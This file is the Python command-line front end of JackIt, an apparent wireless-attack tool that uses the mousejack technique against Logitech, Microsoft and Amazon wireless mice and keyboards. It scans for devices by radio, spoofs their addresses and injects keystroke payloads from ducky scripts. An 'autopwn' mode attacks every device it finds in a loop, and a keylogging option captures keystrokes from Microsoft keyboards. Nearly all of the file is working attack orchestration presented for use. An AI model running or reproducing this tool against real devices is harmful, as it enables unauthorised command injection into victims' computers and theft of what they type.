#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function
import os
import sys
import time
import datetime
import platform
import click
import tabulate
import duckyparser
import mousejack
import keylogger


__version__ = 1.00
__authors__ = "phikshun, infamy"

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


def launch_attacks(jack, targets, attack, use_ping=True):
    for addr_string, target in targets.iteritems():
        payload  = target['payload']
        channels = target['channels']
        address  = target['address']
        hid      = target['device']

        # Sniffer mode allows us to spoof the address
        jack.sniffer_mode(address)

        if hid:
            # Attempt to ping the devices to find the current channel
            if use_ping:
                lock_channel = jack.find_channel(address)
            else:
                lock_channel = False

            if lock_channel:
                print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
                print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), lock_channel))
                jack.attack(hid(address, payload), attack)
            else:
                # If our pings fail, go full hail mary
                print(R + '[-] ' + W + 'Ping failed, trying all channels')
                for channel in channels:
                    jack.set_channel(channel)
                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), channel))
                    jack.attack(hid(address, payload), attack)
        else:
            print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (addr_string))
            continue


def scan_loop(jack, interval, targeted, address):
    if targeted:
        jack.sniff(interval, address)
    else:
        jack.scan(interval)

    click.clear()
    if targeted:
        print(GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready.")
    else:
        print(GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready.")
    print("")

    pretty_devices = []
    for addr_string, device in jack.devices.iteritems():
        if device['device']:
            device_name = device['device'].description()
        else:
            device_name = 'Unknown'
        pretty_devices.append([
            device['index'],
            addr_string,
            ",".join(str(x) for x in device['channels']),
            device['count'],
            str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
            device_name,
            jack.to_display(device['payload'])
        ])

    print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))


def _print_err(text):
    print(R + '[!] ' + W + text)


def banner():
    print(r"""
     ____.              __   .___  __
    |    |____    ____ |  | _|   |/  |_
    |    \__  \ _/ ___\|  |/ /   \   __\
/\__|    |/ __ \\  \___|    <|   ||  |
\________(____  /\___  >__|_ \___||__|
              \/     \/     \/          """)

    print("JackIt Version %0.2f" % __version__)
    print("Created by %s" % __authors__)
    print("")


def confirm_root():
    # make sure we are root
    if os.getuid() != 0 and platform.system() != 'Darwin':
        _print_err("ERROR: You need to run as root!")
        _print_err("login as root (su root) or try sudo %s" % sys.argv[0])
        exit(-1)


@click.command()
@click.option('--debug', is_flag=True, help='Enable debug')
@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
@click.option('--layout', default='us', help="Keyboard layout: us, gb, de...")
@click.option('--address', default="", help="Address of device to target attack")
@click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
@click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
@click.option('--autopwn', is_flag=True, help="Automatically find and attack all targets")
@click.option('--all-channels', is_flag=True, help="Send attack to all detected channels")
@click.option('--keylogging', is_flag=True, help="Log keystrokes for XOR encrypted MS keyboards")
def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn, all_channels, keylogging):

    banner()
    confirm_root()

    if debug:
        print(O + "[W] " + W + "Debug is enabled.")

    targeted = False
    if address and not vendor:
        _print_err("Please use --vendor option to specify either Logitech, Microsoft or Amazon.")
        exit(-1)
    elif vendor and not address:
        _print_err("Please use --address option when specifying a vendor.")
        exit(-1)
    elif vendor and address:
        vendor = vendor.lower()
        if not vendor.startswith("l") and not vendor.startswith("m") and not vendor.startswith("a"):
            _print_err("Unknown vendor: specify either Microsoft, Logitech or Amazon.")
            exit(-1)
        else:
            targeted = True

    if script == "":
        if not keylogging:
            _print_err("You must supply a ducky script using --script <filename>")
            _print_err("Attacks are disabled.")
        attack = ""
    else:
        f = open(script, 'r')
        try:
            parser = duckyparser.DuckyParser(f.read(), layout=layout.lower())
        except KeyError:
            print("Invalid layout specified")
            exit(-1)

        attack = parser.parse()

    # Initialize the radio
    try:
        jack = mousejack.MouseJack(lowpower, debug, reset)
    except Exception as e:
        if e.__str__() == "Cannot find USB dongle.":
            _print_err("Cannot find Crazy PA USB dongle.")
            _print_err("Please make sure you have it preloaded with the mousejack firmware.")
            exit(-1)
        else:
            raise e

    if keylogging:
        k = keylogger.KeyLogger(jack, layout)
        k.scan()
        exit(-1)

    try:
        if autopwn:
            if not attack:
                _print_err('No attack specified for autopwn. Exiting.')
                exit(-1)

            while True:
                print(G + "[+] " + W + 'Scanning for targets...')
                jack.scan(interval)
                if len(jack.devices) > 0:
                    launch_attacks(jack, jack.devices, attack)
                else:
                    _print_err('No devices found')
                jack.clear_devices()

        if targeted:
            print(G + "[+] " + W + 'Starting sniff for %s...' % address)
            if vendor.startswith("l"):
                jack.add_device(address, [0, 0xC2, 0, 0, 0, 0, 0, 0, 0, 0])
            if vendor.startswith("m"):
                jack.add_device(address, [])
            if vendor.startswith("a"):
                jack.add_device(address, [0, 0, 0, 0, 0, 0])
        else:
            print(G + "[+] " + W + 'Starting scan...')

        try:
            while True:
                scan_loop(jack, interval, targeted, address)
        except KeyboardInterrupt:
            print()

        if len(jack.devices) == 0:
            _print_err("No devices found please try again...")
            exit(-1)

        if attack == "":
            _print_err("No attack script was provided...")
            exit(-1)

        print(GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(jack.devices)) + W) + " separated by commas, or '%s': " % (G + 'all' + W), end="")
        value = click.prompt('', default="all")
        value = value.strip().lower()

        if value == "all":
            targets = jack.devices
        else:
            targets = {}
            target_list = [int(x) for x in value.split(',')]
            for addr_string, device in jack.devices.iteritems():
                if device['index'] in target_list:
                    targets[addr_string] = device

        launch_attacks(jack, targets, attack, (not all_channels))

        print(GR + '\n[+] ' + W + "All attacks completed\n")

    except KeyboardInterrupt:
        print('\n ' + R + '(^C)' + O + ' interrupted\n')
        print('[-] Quitting' + W)


if __name__ == '__main__':
    cli()
